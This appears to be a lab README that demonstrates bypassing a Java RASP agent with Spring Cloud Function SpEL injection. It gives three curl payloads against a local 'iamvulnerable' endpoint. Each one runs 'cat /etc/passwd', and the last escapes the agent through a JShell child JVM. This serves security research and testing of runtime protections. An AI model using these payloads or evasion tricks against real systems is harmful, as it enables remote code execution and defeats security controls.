- Use your own RASP agent or use [rasp-agent](..%2Frasp-agent)
- if you use [rasp-agent](..%2Frasp-agent), add:
    - env RASP_AGENT_PATH=path/to/rasp-agent/target/rasp-agent-1.0.0-SNAPSHOT.jar
- Run [Main.kt](src%2Fmain%2Fjava%2Fcom%2Fapplicationsec%2FMain.kt) with the VM option:
    - -javaagent:path/to/rasp-agent/target/rasp-agent-1.0.0-SNAPSHOT.jar

# attempt 1 [We are blocked]
`curl  -X POST http://localhost:8080/iamvulnerable \
   -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')"`
    
    ![spel-block.png](spel-block.png)

# attempt 2 [We bypassed Spel guards but we are still blocked as there are other guards]

`curl  -X POST http://localhost:8080/iamvulnerable -H "spring.cloud.function.routing-expression:   T(java.lang.ClassLoader).getSystemClassLoader().loadClass(\"java.lang\" + \".Runtime\").getMethods()[0].invoke(null).exec(\"cat /etc/passwd\")"
`
    ![fork-block.png](fork-block.png)

# Bypass using JVM escape 

`curl  -X POST http://localhost:8080/iamvulnerable -H "spring.cloud.function.routing-expression:   T(jdk.jshell.JShell).create().eval('System.out.println(\"Bypassed RASP - \" + ((Runtime)ClassLoader.getSystemClassLoader().loadClass(\"java.lang\" + \".Runtime\").getMethods()[0].invoke(null)).exec(\"cat /etc/passwd\").toString())')"
`
As shown below, we execute code in a child JVM, where RASP agent is not loaded. 

![Capture d’écran 2024-03-24 à 13.21.04.png](..%2F..%2F..%2F..%2F..%2Fvar%2Ffolders%2Fw8%2Fr4kv8dx50r36vrvmhp6lxt8h0000gn%2FT%2FTemporaryItems%2FNSIRD_screencaptureui_a3pO6v%2FCapture%20d%E2%80%99%C3%A9cran%202024-03-24%20%C3%A0%2013.21.04.png)